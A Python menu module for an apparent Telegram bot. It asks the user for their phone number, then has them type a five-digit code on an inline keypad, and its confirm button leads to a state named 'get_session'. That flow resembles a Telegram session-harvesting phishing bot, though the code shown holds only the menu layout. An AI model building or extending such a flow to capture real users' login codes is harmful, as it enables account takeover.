from tgbot.states.State import State
from tgbot.services.MenuAPI import Menu


class main_menu:

	async def main(self, user_id, admin_id):
		menu = Menu()
		await menu.add_inline_button([{
			'name': '👉 Начать',
			'state': State.menu.get_phone
		}])
		return await menu.get_markup()


	async def get_phone(self):
		return await Menu().get_contact_button('👉 Отправить номер')


	async def update_code(self, code):
		menu = Menu()
		buttons = [['1', '2', '3'], ['4', '5', '6'], ['7', '8', '9']]
		x = len(code)
		for line in buttons:
			line_buttons = []
			for i in line:
				line_buttons.append({
					'name': ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣'][int(i)-1],
					'state': State.menu._update_code,
					'callback': f'_select_{i}_{x}',
					'_select': i,
					'if': not x > 5,
					'answer': '❌ Код не может быть больше 5 символов.'

				})
			await menu.add_inline_button(line_buttons)
		
		await menu.add_inline_button([
			{
				'name': '⬅️',
				'state': State.menu._update_code_back,
				'callback': f'_back_{x}',
				'if': x,
				'answer': '❌ Нельзя стереть то, чего нет.'
			},
			{
				'name': '0️⃣',
				'state': State.menu._update_code,
				'callback': f'_select_0_{x}',
				'_select': '0',
				'if': not x > 5,
				'answer': '❌ Код не может быть больше 5 символов.'
			},
			{
				'name': '✅',
				'state': State.menu.get_session,
				'callback': f'_ready_{x}',
				'if': x == 5,
				'answer': '❌ Код должен состоять из 5 символов.'
			}
		])

		return await menu.get_markup()